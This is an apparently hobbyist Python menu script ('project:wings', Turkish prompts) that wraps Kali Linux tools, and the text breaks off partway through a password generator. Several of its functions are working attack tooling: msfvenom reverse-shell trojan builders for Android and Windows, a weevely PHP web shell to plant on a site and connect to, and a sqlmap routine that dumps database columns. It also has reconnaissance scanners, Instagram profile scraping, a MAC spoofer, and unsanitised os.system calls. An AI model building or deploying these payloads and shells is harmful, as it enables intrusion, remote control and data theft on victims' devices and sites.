#!/usr/bin/env python

# -*- coding: utf-8 -*-


##################################################
#                 project:wings                  #
#                Automatized Kali                #
#                  Linux Tools                   #
#              github.com/oxydes-cyber           #
#        !!!DONT COPY WITHOUT PERMISSIONS!!!     #
#                 Author: oxydes                 #
#          contact: instagram.com/oxydes7        #
#           https://allmylinks.com/oxydes        #
#              DEVELOPMENT IN PROGRESS           #
##################################################
import os

import colorama

import time

import instaloader

import onetimepad

import psutil

from tabulate import tabulate

import speedtest

from tkinter import *

import pyqrcode

import random

import subprocess

from pytube import YouTube

import sys

import phonenumbers

import wikipedia

import requests

import folium

import webbrowser

import tkinter as tk

from tkinter import filedialog

from PIL import Image

import selenium

import json

import instagram_explore as ie

import bs4

import pyshorteners

import pyperclip

from phonenumbers import geocoder, carrier

try:

    def banner():
        print(
            """
                ##################################################
                #                 project:wings                  #
                #                Automatized Kali                #
                #                  Linux Tools                   #
                #              github.com/oxydes-cyber           #
                #        !!!DONT COPY WITHOUT PERMISSIONS!!!     #
                #                 Author: oxydes                 #
                #          contact: instagram.com/oxydes7        #
                #           https://allmylinks.com/oxydes        #
                #              DEVELOPMENT IN PROGRESS           #
                ##################################################
                """
        )

    def banner_two():
        from colorama import Fore, Style

        os.system("clear")
        print(
            Fore.RED
            + """
                                                       /$$
                                                      |__/
                                         /$$  /$$  /$$ /$$ /$$$$$$$   /$$$$$$   /$$$$$$$
                                        | $$ | $$ | $$| $$| $$__  $$ /$$__  $$ /$$_____/
                                        | $$ | $$ | $$| $$| $$  \ $$| $$  \ $$|  $$$$$$
                                        | $$ | $$ | $$| $$| $$  | $$| $$  | $$ \____  $$
                                        |  $$$$$/$$$$/| $$| $$  | $$|  $$$$$$$ /$$$$$$$/
                                         \_____/\___/ |__/|__/  |__/ \____  $$|_______/
                                                                     /$$  \ $$
                                                                    |  $$$$$$/
                                                                     \______/
                                O7      O7      O7      O7      O7      O7      O7      O7      O7      O7
                                O7      O7      O7      O7      O7      O7      O7      O7      O7      O7
                                O7      O7      O7      O7      O7      O7      O7      O7      O7      O7
                """
        )
        print(Fore.BLUE)

    banner_two()
    time.sleep(5)
    os.system("clear")
    banner()

    def netdiscover():
        os.system("clear")
        os.system("figlet NETDISCOVER")
        print("Netdiscovera Hoşgeldiniz :)")
        time.sleep(7)
        os.system("netdiscover")

    def nikto():
        os.system("clear")
        os.system("figlet Nikto Scanner")
        print("Nikto Web Açık Tarayıcısına Hoşgeldiniz:)")
        time.sleep(3)
        ip = input("Hedef Ip Adresini Veya Host Adresini Gir : ")
        os.system("nikto -h " + ip + " -e 3")

    def trojan():

        os.system("clear")
        os.system("figlet MSFVENOM")
        print("Trojan Oluşturucuya Hoşgeldiniz:)")
        print(
            """
                Payloadlar ;
                1)Telefonlar İçin
                2)Windows İçin
                """
        )

        secim = int(input("Seçiminizi Yapın : "))
        lhost = input("IP Adresinizi Girin : ")
        lport = input("Portu Girin (443) : ")
        if secim == 1:
            os.system(
                "msfvenom -p android/meterpreter/reverse_tcp LHOST="
                + lhost
                + " LPORT="
                + lport
                + " -f raw -e generic/none -i 1 -o /root/Masaüstü/trojen.apk"
            )
            print("Trojan /root/Masaüstü/trojen.apk Yoluna Oluşturuldu.")

        if secim == 2:
            os.system(
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST="
                + lhost
                + " LPORT="
                + lport
                + " -f exe -e generic/none -i 1 -o /root/Masaüstü/trojen.exe"
            )
            print("Trojan /root/Masaüstü/trojen.exe Yoluna Oluşturuldu.")

    def rootkit():
        os.system("clear")
        os.system("figlet ROOTKIT SCANNER")
        soru = input("Rootkit Taraması Yapmak İster Misiniz ? (e/h) : ")
        if soru == "e":
            os.system("chkrootkit")
        elif soru == "h":
            print("Pekala :)")

    def weevely():
        os.system("clear")

        os.system("figlet WEB SHELL")

        while True:

            soru = input("Shell Dosyası Üretilsin Mi? (e/h) (çıkmak için q) : ")

            if soru == "e":
                sifre = input("Dosyaya Erişmek İçin Bir Şifre Girin : ")
                print("Dosya Üretiliyor...")
                time.sleep(2)
                os.system(
                    "weevely generate " + sifre + " /root/Masaüstü/php_dosyasi.php"
                )
                print("Dosya /root/Masaüstü/php_dosyasi.php Yoluna Oluşturuldu...")
                secim = input(
                    "Dosya Dinlemeye Alınsın Mı (lütfen dosyayı siteye yükledikten sonra burayı cevaplayın(e/h çıkmak için q)) : "
                )
                if secim == "e":
                    url = input("Dosyayı Yüklediğiniz Adresi Girin : ")
                    print("3 Saniye Sonra Bağlantı Kurulmaya Çalışılacak...")
                    time.sleep(3)
                    os.system("weevely " + url + " " + sifre)
                elif secim == "h":
                    print("Uygulamadan Çıkılıyor...")
                    False
                elif secim == "q":
                    sys.exit()
            elif soru == "h":
                print("Uygulamadan Çıkılıyor...")
                False
            elif soru == "q":
                sys.exit()

    def skipfish():

        os.system("clear")

        os.system("figlet SKIPFISH")

        print("LÜTFEN URLYI https://site.com/ OLARAK GİRİN")

        print("Skipfish Sistemlerde Açık Tarayan İleri Düzey Bir Uygulamadır.")

        while True:
            secim = input("Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : ")
            if secim == "e":
                url = input("Hedef Site Url Adresi Girin : ")
                print("3 Saniye Sonra Tarama Başlatılacak...")
                time.sleep(3)
                os.system("skipfish -o /root/Masaüstü/sonuclar " + url)
                print("Sonuçlar /root/Masaüstü/sonuclar/index.html Yoluna Kaydedildi")

            elif secim == "h":
                print("Pekala:)")
                False
            elif secim == "q":
                print("Görüşmek Üzere :)")
                sys.exit()
            else:
                print("Beklenmeyen Hata:(")

    def nmap():
        os.system("clear")
        os.system("figlet NMAP")
        print("Port Scannera Hoşgeldiniz Nmap Kullanılarak Yapılmıştır...")
        while True:
            soru = input("Devam Etmek İster Misiniz? (e/h) : ")
            if soru == "e":

                print(
                    """
                                1)Hızlı Tarama
                                2)Firewall Taraması
                                3)İşletim Sistemi Taraması
                                4)SYN Taraması
                                5)Versiyon Taraması
                                6)SYN + Versiyon
                                7)Hepsi Bir Arada Tarama
                                """
                )
                secim = int(input("Seçiminizi Girin : "))
                ip = input("Hedef Host Veya Ip Adresi : ")
                if secim == 1:
                    os.system("nmap " + ip)
                elif secim == 2:
                    os.system("nmap -sA --script=http-waf-detect " + ip)
                elif secim == 3:
                    os.system("nmap -O " + ip)
                elif secim == 4:
                    os.system("nmap -sS " + ip)
                elif secim == 5:
                    os.system("nmap -sV " + ip)
                elif secim == 6:
                    os.system("nmap -sS -sV " + ip)
                elif secim == 7:
                    os.system("nmap -A -O -sS -sV -sC" + ip)

                else:
                    print("Hatalı Giriş")

            elif soru == "h":
                print("Görüşürüz :)")
                sys.exit()

    def sqlmap():

        os.system("figlet SQLMAP")

        print("Uygulama 3 Saniye Sonra Başlatılacak...")
        time.sleep(3)
        while True:
            soru = input(
                "SQLMAP Başlatıldı Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : "
            )
            if soru == "e":
                url = input("Açıklı Url'yi Girin : ")
                os.system("sqlmap -u " + url + " --dbs")
                sual = input(
                    "Databaseler Göründüyse e Tuşlayın(gözükmediyse açık yoktur...)"
                )
                if sual == "e":
                    database = input("Database Adını Girin : ")
                    os.system("sqlmap -u " + url + " -D " + database + " --tables")
                    tables = input("Table Adını Girin : ")
                    os.system(
                        "sqlmap -u "
                        + url
                        + " -D "
                        + database
                        + " -T "
                        + tables
                        + " --columns"
                    )
                    column = input("Column Adı Girin : ")
                    os.system(
                        "sqlmap -u "
                        + url
                        + " -D "
                        + database
                        + " -T "
                        + tables
                        + " -C "
                        + column
                        + " --dump"
                    )
                    print("İşlem Bitti Hoşçakal...")
                    sys.exit()
            elif soru == "h":
                print("Peki:)")
                False
            elif soru == "q":
                print("Görüşürüz...")
                sys.exit()

    def osint_by_phone():
        from phonenumbers import geocoder, carrier

        os.system("clear")
        os.system("figlet OSINT BY PHONE")
        print("Lütfen Telefon Numarasını +905********* gibi giriniz.")
        print("Telefon Numarasından Ülke ve GSM Şirketi Bul")
        while True:
            secimin = input("Devam Etmek İçin e Çıkmak İçin h Girin : ")
            if secimin == "e":
                phone_number = input("Telefon Numarası Giriniz : ")
                isleme_girecek = phonenumbers.parse(phone_number)
                print(geocoder.description_for_number(isleme_girecek, "en"))
                print(carrier.name_for_number(isleme_girecek, "en"))
            elif secimin == "h":
                print("Peki ;)")
                False
                break

    def dnsmap():
        os.system("clear")
        os.system("figlet dnsmap")
        print("dnsmap'e hoşgeldin.Hedef siteyi gir.Subdomainleri söylesin.")
        while True:
            secim = input("dnsmap'i seçtiniz.Devam etmek istiyor musunuz? e/h : ")
            if secim == "e":
                web = input("hedef siteyi gir : ")
                os.system("dnsmap " + web)
            elif secim == "h":
                print("yönlendiriliyorsunuz...")
                False
                break

    def dirb():
        os.system("clear")
        os.system("figlet DIRB")
        print(
            "Dirb'e hoşgeldin.Hedef siteyi gir,Hedef sitedeki içeriklerin linklerine ulaş."
        )
        while True:
            secim = input(
                "Dirb seçeneğini seçtiniz.Devam etmek istiyor musunuz? e/h : "
            )
            if secim == "e":
                print(
                    "ÖNEMLİ!!! : Web sitesini http://domain.com veya https://domain.com olarak girin,aksi takdirde çalışmayacaktır."
                )
                site = input("Web sitesini giriniz : ")
                os.system("dirb " + site + " /usr/share/dirb/wordlists/big.txt")
            elif secim == "h":
                print("Görüşmek Üzere :)")
                False
                break

    def theHarvester():
        os.system("clear")
        os.system("figlet theHarvester")
        print(
            "theHarvester'a hoşgeldin.Hedef siteyi gir theHarvester sana aktif,pasif bilgi toplasın."
        )
        while True:
            secim = input(
                "theHarvester'ı seçtin.Devam etmek için e Çıkmak için h tuşuna bas : "
            )
            if secim == "e":
                domain = input("Hedef siteyi gir : ")
                sonuclar = input(
                    "Sonuçları kaydetmek için alan girin.(örneğin : /root/Masaüstü/sonuclar) : "
                )
                os.system(
                    "theHarvester -d "
                    + domain
                    + " -b all -l 400 -v -s -n -f "
                    + sonuclar
                )
                print("Sonuçlar " + sonuclar + " klasörüne kaydedildi.")
            elif secim == "h":
                print("Hoşçakal:')")
                False
                break

    def dig():
        os.system("clear")
        os.system("figlet DIG")
        print("DIG'e hoşgeldin.Hedef sitenin domain kayıtlarını gösterir.")
        while True:
            ques = input(
                "dig seçeneğini seçtin.Devam etmek istediğinden emin misin? e/h : "
            )
            if ques == "e":
                domain = input("Hedef siteyi gir : ")
                print("Sonuçlar yükleniyor...")
                time.sleep(3)
                os.system("dig +trace " + domain)
            elif ques == "h":
                False
                break

    def whois():
        os.system("clear")
        os.system("figlet WHOIS")
        while True:
            ques = input("whois'e hoşgeldin.devam etmek ister misin? e/h : ")
            if ques == "e":
                domain = input("domain gir : ")
                print("sonuçlar yükleniyor...")
                time.sleep(3)
                os.system("whois " + domain)
            elif ques == "h":
                False
                break

    def firewall_detect():
        os.system("clear")
        os.system("figlet wafw00f")
        while True:
            ques = input(
                "Merhaba 'Web Aplikasyonu Güvenlik Duvarı Tarayıcısı :)''nı seçtin devam etmek istiyor musun? e/h : "
            )
            if ques == "e":
                www = input("Hedef Domain'i gir : ")
                time.sleep(2)
                os.system("wafw00f " + www)
            elif ques == "h":
                False
                break

    def wiki():
        os.system("clear")
        os.system("figlet WIKIPEDIA")
        print("Bu uygulama terminal üzerinden wikipedia araması yapmaznızı sağlar.")

        while True:
            ques = input("\nDevam etmek istiyor musun? e/h : ")
            if ques == "e":
                search = input("Neyi aramak istersiniz? : ")
                result = wikipedia.summary(search)
                print(result)
            elif ques == "h":
                False
                break
            else:
                print("Bir hatayla Karşılaşıldı...")
                sys.exit()

    def insta_explore():
        os.system("clear")
        os.system("figlet IG_EXPLORE")

        while True:
            print("Bu uygulama Instagram profillerinin verilerini çeker")
            ques = input(
                "\n'InstaExplore' seçtiniz,devam etmek istiyor musunuz? e/h : "
            )

            if ques == "e":
                # kullanıcıyı bul
                name = input("Hedefin kullanıcı adını girin : ")
                result = ie.user(name)

                parsed_data = json.dumps(result, indent=4, sort_keys=True)

                # bilgileri göster
                print(parsed_data[15:400])

            elif ques == "h":
                secim = input("Emin Misiniz? e/h : ")

                if secim == "e":
                    False
                    break
                elif secim == "h":
                    True
            else:
                print("Bir Hatayla Karşılaşıldı...")
                False
                break
                sys.exit()

    def url_scraper():
        from bs4 import BeautifulSoup

        os.system("clear")
        os.system("figlet SITE_SCRAPER")
        print(
            "\nLütfen siteyi http veya https belirterek girin.örn : https://google.com"
        )

        # boş liste oluştur
        urls = []

        # fonksiyon oluştur
        def scrape(site):
            # url'den request'i al
            r = requests.get(site)
            # text'i dönüştür
            s = BeautifulSoup(r.text, "html.parser")

            for i in s.find_all("a"):
                href = i.attrs["href"]
                if href.startswith("/"):
                    site = site + href
                    if site not in urls:
                        urls.append(site)
                        print(site)
                        # scrape fonksiyonunu çağırma(itself)/recursion
                        scrape(site)

        # ana fonksiyon

        if __name__ == "__main__":
            # scrapelenecek site
            site = input("Web Sitesini Gir : ")
            # fonksiyonu çağır
            scrape(site)

    def ip_information():
        os.system("clear")
        os.system("figlet IP_INFO")
        print("@alismsk234'den esinlenilmiştir,teşekkürler.\n")

        ipA = input("Hedef ip adresini gir>> ")
        adres = "https://tools.keycdn.com/geo.json?host=" + ipA
        baglan = requests.post(adres)
        baGlann = baglan.json()
        print("İp adresi: " + baGlann["data"]["geo"]["ip"])
        print("Konumu: " + baGlann["data"]["geo"]["timezone"])
        print("Posta Kodu: " + baGlann["data"]["geo"]["postal_code"])

        a = baGlann["data"]["geo"]["latitude"]
        b = baGlann["data"]["geo"]["longitude"]
        print("Koordinat: ", a, ",", b)
        c = baGlann["data"]["geo"]["city"]
        d = baGlann["data"]["geo"]["region_code"]
        print("Şehir ve şehir kodu: ", c, d)

        ques = input("Koordinatlarına haritadan bakılsın mı? e/h >> ")

        if ques == "e" or "E":
            map = folium.Map(location=[str(a), str(b)])
            map.save("map1.html")
            print(
                "Harita 'project-wings' dizinin altındaki wings klasörünün altına 'map1.html' olarak kaydedildi."
            )

        elif ques == "h" or "H":
            print("Görüşmek üzere")
        else:
            print("Hata...")
            sys.exit()

    def video_downloader():
        os.system("clear")
        os.system("figlet YT Downloader")
        print("Bu uygulama YouTube videolarını yükler...")
        time.sleep(2)
        while True:
            ques = input(
                "YouTube video indiriciyi seçtiniz...Devam etmek istiyor musunuz ? e/h : "
            )
            if ques == "e":
                link = input("indirmek istediğin videonun linkini gir : ")
                print("\nindiriliyor\n")
                time.sleep(1)
                YouTube(link).streams.first().download()
                print("video wings.py dosyasını çalıştırdığınız klasöre indirildi...")
            elif ques == "h":
                print("Görüşürüz :)")
                False
                break
            else:
                print("Beklenmedik Hata")

    def crypto():

        root = Tk()
        root.title("CRYPTOGRAPHY")
        root.geometry("430x100")

        def encryptMessage():
            pt = e1.get()
            ct = onetimepad.encrypt(pt, "random")
            e2.insert(0, ct)

        def decryptMessage():
            ct1 = e3.get()
            pt1 = onetimepad.decrypt(ct1, "random")
            e4.insert(0, pt1)

        label1 = Label(root, text="plaintext")
        label1.grid(row=10, column=1)
        label2 = Label(root, text="encrypted text")
        label2.grid(row=11, column=1)
        l3 = Label(root, text="cypher text")
        l3.grid(row=10, column=10)
        l4 = Label(root, text="decrypted text")
        l4.grid(row=11, column=10)

        e1 = Entry(root)
        e1.grid(row=10, column=2)
        e2 = Entry(root)
        e2.grid(row=11, column=2)
        e3 = Entry(root)
        e3.grid(row=10, column=11)
        e4 = Entry(root)
        e4.grid(row=11, column=11)

        ent = Button(root, text="encrypt", bg="red", fg="white", command=encryptMessage)
        ent.grid(row=13, column=2)

        b2 = Button(
            root, text="encrypt", bg="green", fg="white", command=decryptMessage
        )
        b2.grid(row=13, column=11)

        root.mainloop()

    def speed_test():
        def internet_speed():
            class Network_Details(object):
                def __init__(self):
                    self.parser = psutil.net_if_addrs()
                    self.speed_parser = speedtest.Speedtest()
                    self.interfaces = self.interface()[0]

                def interface(self):
                    interfaces = []
                    for interface_name, _ in self.parser.items():
                        interfaces.append(str(interface_name))
                        return interfaces

                def __repr__(self):
                    down = str(
                        f"{round(self.speed_parser.download() / 1_000_000, 2)} Mbps"
                    )
                    up = str(f"{round(self.speed_parser.upload() / 1_000_000, 2)} Mbps")
                    interface = self.interfaces
                    data = {
                        "Interface : ": [interface],
                        "Download : ": [down],
                        "Upload : ": [up],
                    }
                    table = tabulate(data, headers="keys", tablefmt="pretty")
                    return table

            if __name__ == "__main__":
                print(Network_Details())

        internet_speed()

    def png_to_jpg():
        root = tk.Tk()

        canvas1 = tk.Canvas(root, width=300, height=250, bg="azure3", relief="raised")
        canvas1.pack()

        label1 = tk.Label(root, text="File Conversion Tool", bg="azure3")
        label1.config(font=("helvetica", 20))
        canvas1.create_window(150, 60, window=label1)

        def getPNG():
            global im1

            import_file_path = filedialog.askopenfilename()
            im1 = Image.open(import_file_path)

        browseButton_PNG = tk.Button(
            text="PNG dosyayı gir",
            command=getPNG,
            bg="royalblue",
            fg="white",
            font=("helvetica", 12, "bold"),
        )
        canvas1.create_window(150, 130, window=browseButton_PNG)

        def convertToJPG():
            global im1
            export_file_path = filedialog.asksaveasfilename(defaultextension=".jpg")
            im1.save(export_file_path)

        saveAsButton_JPG = tk.Button(
            text="PNG dosyasını JPG dosyasına çevir",
            command=convertToJPG,
            bg="royalblue",
            fg="white",
            font=("helvetica", 12, "bold"),
        )
        canvas1.create_window(150, 180, window=saveAsButton_JPG)

        root.mainloop()

    def domain_check():
        os.system("clear")
        os.system("figlet Domain Check")
        print("\nDomain'in satın alınıp alınmadığını gösterir.\n")
        try:
            www = input("Domain'i girin >> ")
            domain = whois.whois(str(www))
            if domain.domain_name == None:
                sys.exit(1)
        except:
            print("Bu domain satın alınmamış :)")
        else:
            print("Domaini almışlar be :((")

    def pp_download():
        os.system("clear")
        os.system("figlet PP_DOWNLOAD")
        print(
            "Bu uygulama instagram profillerinin profil fotoğraflarını ve bilgilerini indirir"
        )

        def picture_download(username):
            parser = instaloader.Instaloader()
            os.chdir(os.path.join(os.path.expanduser("~"), "Downloads"))

            if os.path.isdir("Instagram Downloads"):
                os.chdir("Instagram Downloads")
                return parser.download_profile(username, profile_pic_only=True)
            else:
                os.mkdir("Instagram Downloads")
                os.chdir("Instagram Downloads")
                return parser.download_profile(username, profile_pic_only=True)

        if __name__ == "__main__":
            user = input("\nInstagram Hesabını Gir >> ")
            picture_download(user)
        print(
            "\nBilgiler Downloads klasörünün altına Instagram Downloads klasörünün altına indirildi"
        )

    def macchanger():
        def change_mac():
            # totally 300 mac addresses
            mac_addresses = [
                "00:11:22:33:44:55",
                "11:21:22:32:33:43",
                "DD:76:EA:F5:94:F3",
                "9F:71:C1:02:7F:6F",
                "1A:6E:3E:D7:3E:97",
                "99:26:92:1B:B3:F2",
                "5E:85:E7:8A:4C:E0",
                "CE:D4:40:37:67:6B",
                "02:53:ED:73:0F:E5",
                "58:94:1B:92:12:F8",
                "67:69:2C:4F:47:F2",
                "CE:B2:35:87:01:79",
                "16:35:BC:E4:C6:7D",
                "8D:37:38:F6:1D:75",
                "E6:34:71:99:07:50",
                "8B:B6:45:83:BD:1E",
                "EC:82:93:DF:DF:F3",
                "C9:4D:04:13:CD:27",
                "2A:44:93:E5:22:28",
                "40:90:05:55:D3:46",
                "E4:3D:A8:DE:32:C5",
                "55:CD:4B:8B:29:5F",
                "4E:32:3C:23:F7:02",
                "50:7D:05:21:B9:9F",
                "C5:D2:5E:5E:E6:3E",
                "64:69:A2:1E:65:DD",
                "95:6F:83:AA:B1:E4",
                "D1:2B:25:2E:FE:80",
                "23:F9:82:8F:A2:90",
                "6C:8D:B2:8F:BF:4F",
                "F1:84:26:35:FC:AC",
                "07:97:8F:D9:DE:F3",
                "E8:20:12:5B:89:92",
                "76:EE:E9:C1:E1:B8",
                "8C:08:BC:C2:E9:FF",
                "FB:AA:61:EC:51:BE",
                "2F:8A:18:7F:A7:07",
                "5A:7E:57:15:91:42",
                "B6:3E:2E:7F:06:DA",
                "9D:42:10:59:54:89",
                "41:07:E6:2F:E5:0C",
                "5F:E0:9C:8A:3D:B3",
                "1E:E6:5A:CD:90:66",
                "0F:A7:5F:CB:22:1C",
                "D8:F6:13:2B:27:87",
                "6E:1D:3E:81:E0:06",
                "15:37:02:1B:9D:00",
                "1A:02:8D:82:24:03",
                "C2:F0:12:FC:62:04",
                "C0:44:D9:70:C0:D2",
                "95:A4:C9:AA:B8:01",
                "19:35:42:0C:53:92",
                "90:4D:44:DF:1E:96",
                "D9:42:81:1F:2F:10",
                "F9:80:A1:56:8E:E4",
                "21:70:83:D0:79:7B",
                "F9:D6:D6:A0:16:00",
                "86:97:3B:41:86:DB",
                "93:E8:43:A4:D6:34",
                "64:E5:7F:CB:99:3F",
                "F6:F4:4C:A0:51:21",
                "31:12:04:0A:15:08",
                "C6:2A:98:7F:47:71",
                "F0:D3:03:FD:19:BD",
                "A3:26:72:32:CC:92",
                "04:15:4F:14:19:36",
                "DE:D0:55:70:63:37",
                "A2:1C:CF:72:D1:1A",
                "85:8A:1A:42:63:D4",
                "FC:9A:BF:B4:B2:05",
                "85:0D:A2:A6:82:73",
                "99:C2:76:B2:24:73",
                "9B:75:B3:D8:15:01",
                "7B:C5:85:3B:C7:CB",
                "39:B1:DF:02:DE:7C",
                "57:8E:11:EA:25:A6",
                "A4:C3:E5:AB:96:7C",
                "DE:24:43:8A:A0:A9",
                "24:2F:3F:9D:4D:BF",
                "16:8C:95:37:88:4B",
                "A8:14:89:B6:0D:9B",
                "94:A5:10:15:18:41",
                "BE:E5:A1:78:5C:80",
                "5A:95:DA:55:76:01",
                "03:B3:EF:7B:2D:C6",
                "24:3D:08:36:C9:D1",
                "2D:3A:5F:A6:D4:3B",
                "14:E5:96:B0:81:52",
                "C3:C8:C5:C1:56:53",
                "7D:9C:E7:48:B3:CC",
                "42:CD:5D:70:7C:79",
                "33:7F:DB:57:79:D4",
                "70:B3:33:E2:0F:22",
                "17:CC:D0:90:4A:70",
                "9B:0C:C4:A8:96:31",
                "95:85:56:20:CE:2D",
                "C0:BB:F4:62:B7:9B",
                "85:78:4E:1B:3E:38",
                "58:53:80:82:F4:60",
                "44:EC:EF:AC:F1:36",
                "A9:99:4A:8C:45:8B",
                "F6:CD:2A:55:A1:5A",
                "F8:5A:FC:42:64:2F",
                "99:C7:9F:6E:78:01",
                "05:40:D1:DF:F2:97",
                "F6:04:FC:6F:5D:A3",
                "7D:09:E5:CE:B5:7F",
                "94:97:60:54:D7:94",
                "E9:86:BC:60:2C:F9",
                "77:5C:9F:5F:95:FE",
                "8B:3B:B8:4E:22:A3",
                "26:BC:A5:35:6C:54",
                "4B:43:F2:27:E6:D9",
                "70:60:6A:84:A4:40",
                "B7:42:21:A9:3B:92",
                "3B:5D:8B:77:EE:59",
                "0D:00:FF:1C:43:54",
                "EF:74:09:FE:F4:52",
                "1F:CA:CA:70:26:E7",
                "77:88:D6:5C:74:C1",
                "B2:FD:31:BF:0C:16",
                "A6:D3:3D:ED:78:92",
                "C2:50:E4:EA:3D:5F",
                "AE:C4:29:CA:EF:44",
                "1F:69:FC:66:CA:9D",
                "FB:BE:28:4D:09:C1",
                "D9:52:6E:0A:9E:60",
                "95:78:31:95:88:A3",
                "ED:4E:FD:16:FC:9C",
                "BF:1A:14:FA:8D:6C",
                "5B:3F:54:27:B4:96",
                "7A:3C:9D:A7:D2:3B",
                "0C:18:E0:02:CC:3C",
                "15:9E:40:91:CA:EE",
                "08:79:EC:81:1D:8D",
                "82:EE:B7:DD:F5:05",
                "D3:8A:0E:0C:50:D6",
                "CE:29:B9:75:69:E3",
                "3B:C2:4A:CD:15:7D",
                "4E:1D:B0:F8:E6:4F",
                "17:FF:76:09:28:DC",
                "07:29:21:DF:E6:64",
                "8B:DF:92:A3:6D:C7",
                "8B:48:77:8E:12:FA",
                "D0:82:22:31:DA:F2",
                "70:86:05:5F:B9:07",
                "D8:1F:05:69:13:66",
                "F0:08:9B:8B:8B:67",
                "08:F2:16:FD:37:93",
                "8E:F8:D7:E4:F9:61",
                "25:E3:A8:4F:1A:82",
                "05:59:2F:27:E6:1F",
                "FA:C1:0F:C4:0D:81",
                "E8:24:44:1D:7B:A4",
                "D5:92:0D:2A:A6:61",
                "0D:D8:3C:7F:D2:E7",
                "D2:74:EC:06:6A:C2",
                "B1:72:29:60:F4:45",
                "E8:76:0A:FB:A7:5A",
                "A8:65:AE:A0:F9:06",
                "3E:FA:76:86:4B:2E",
                "04:BD:C1:28:42:FB",
                "45:59:71:79:28:77",
                "45:CC:46:B2:5C:A8",
                "F4:F1:4B:75:92:57",
                "86:7B:37:C9:45:38",
                "E5:12:D2:BA:8A:7F",
                "DE:FC:44:C6:8F:68",
                "80:24:51:16:8F:3C",
                "99:14:69:1B:67:7E",
                "2C:32:F4:2B:22:A3",
                "69:12:D6:F7:BD:47",
                "67:F4:45:32:A8:5F",
                "D7:7F:48:BB:22:A9",
                "E4:04:89:9B:39:17",
                "3C:E0:19:BA:BA:85",
                "2A:D5:30:8D:A6:68",
                "E8:63:2E:D0:19:17",
                "92:9A:5B:75:D3:CE",
                "D9:AF:CE:0B:CF:1E",
                "18:09:F5:11:29:01",
                "DE:B9:B8:CD:B1:40",
                "2E:D9:0A:69:AB:6A",
                "09:CE:E5:00:7B:57",
                "37:22:8E:6D:01:83",
                "D7:9F:0F:21:ED:DE",
                "31:B7:B0:6F:33:CD",
                "DC:AD:F7:7F:87:58",
                "B8:F7:F9:31:90:1E",
                "BD:BD:B3:29:8B:09",
                "E6:69:E5:40:5A:54",
                "07:1C:4C:E0:42:61",
                "DB:F8:D3:DD:A9:64",
                "32:C8:54:72:12:4A",
                "F0:7A:0C:EE:9A:EF",
                "19:E0:9A:9B:E6:8E",
                "48:C0:8E:AC:81:09",
                "14:E3:03:F7:22:6B",
                "53:0B:07:52:4B:60",
                "A7:25:F1:B6:D9:11",
                "A2:5B:15:FA:14:DF",
                "67:78:51:3B:4C:EB",
            ]

            subprocess.call(["figlet", "MAC CHANGER"])
            print("\nMac adresinizi değiştirin, Anonimliğinizi koruyun;)")

            while True:
                ques = input(
                    "Mac değiştiriciyi seçtiniz devam etmek ister misiniz? e/h >> "
                )
                if ques.lower() == "e":
                    subprocess.call(["clear"])
                    print(
                        """
                    1)Mac'i Elle gir

                    2)Mac'i Random seç
                    """
                    )
                    mac_ques = int(input("\nSeçimini Gir >> "))

                    if mac_ques == 1:
                        interface_for_manual = input(
                            "Interface'inizi girin | örn: wlan0, eth0, wlan0mon >> "
                        )
                        mac_address_for_manual = input(
                            "Kullanmak istediğiniz Mac adresini girin | örn: 00:11:22:33:44:55 >> "
                        )

                        subprocess.call(["ifconfig", interface_for_manual, "down"])
                        subprocess.call(
                            [
                                "ifconfig",
                                interface_for_manual,
                                "hw",
                                "ether",
                                mac_address_for_manual,
                            ]
                        )
                        subprocess.call(["ifconfig", interface_for_manual, "up"])
                        print(f"Yeni Mac adresiniz >> {mac_address_for_manual}")

                    elif mac_ques == 2:
                        interface_for_random = input(
                            "Interface'inizi girin | örn: wlan0, eth0, wlan0mon >> "
                        )
                        mac_address_for_random = random.choice(mac_addresses)

                        subprocess.call(["ifconfig", interface_for_random, "down"])
                        subprocess.call(
                            [
                                "ifconfig",
                                interface_for_random,
                                "hw",
                                "ether",
                                mac_address_for_random,
                            ]
                        )
                        subprocess.call(["ifconfig", interface_for_random, "up"])

                        print(f"Yeni Mac Adresiniz >> {mac_address_for_random}")

                elif ques.lower() == "h":
                    sual = input("Çıkmak istediğinden emin misin? e/h >> ")
                    if sual.lower() == "e":
                        sys.exit()
                    elif sual.lower() == "h":
                        True
                else:
                    print("Beklenmedik Bir Hata İle karşılaşıldı...")
                    sys.exit()

        change_mac()

    def shorten_url():
        def url_shortener():

            subprocess.call(["clear"])

            subprocess.call(["figlet", "URL SHORTENER"])

            while True:
                ques = input(
                    "\nUrl Kısaltıcıyı seçtiniz, devam etmek ister misiniz? e/h >> "
                )

                if ques.lower() == "e":

                    subprocess.call(["clear"])

                    subprocess.call(["figlet", "URL SHORTENER"])

                    url = input("Kısaltmak istediğiniz URL'yi girin >> ")

                    shortened = pyshorteners.Shortener().tinyurl.short(url)

                    print(f"Kısaltılmış URL >> {shortened}")

                    print(
                        "URL 5 saniye sonra kopyalama panosuna kopyalanacak,kopyalanmasını istemiyorsanız 'ctrl + c' basın"
                    )

                    time.sleep(5)

                    pyperclip.copy(shortened)

                    subprocess.call(["clear"])

                    print("\nURL Kopyalama panosuna kopyalandı :)")

                elif ques.lower() == "h":
                    sual = input("Çıkmak istediğinden emin misin? e/h >> ")
                    if sual.lower() == "e":
                        sys.exit()
                    elif sual.lower() == "h":
                        True

                else:
                    print("Beklenmedik Bir Hata İle karşılaşıldı...")
                    sys.exit()

        url_shortener()

    def video_gui():
        root = Tk()

        root.geometry("400x350")

        root.title("Youtube Video Yükleyici")

        def download():

            try:
                myVar.set("Yükleniyor...")
                root.update()
                YouTube(link.get()).streams.first().download()
                link.set("Video Yüklendi")
            except Exception as e:
                myVar.set("Hata")
                root.update()
                link.set("Doğru bir link girin...")

        Label(root, text="YouTube Video \nİndirme", font="Consolas 15 bold").pack()
        myVar = StringVar()
        myVar.set("Aşağıdaki kutuya linki girin...")
        Entry(root, textvariable=myVar, width=40).pack(pady=10)
        link = StringVar()
        Entry(root, textvariable=link, width=40).pack(pady=10)
        Button(root, text="Videoyu İndir", command=download).pack()
        root.mainloop()

    def generate_password():
        root = Tk()

        root.geometry("400x400")

        passstr = StringVar()

        passlen = IntVar()

        passlen.set(0)

        def generate():
            pass1 = [
                "a",
                "b",
                "c",
                "d",
                "e",
                "f",
                "g",
                "h",
                "i",
                "j",
                "k",
                "l",
                "m",
                "n",
                "o",
                "p",
                "q",
                "r",
                "s",
                "t",
                "u",
                "v",
                "w",
                "x",
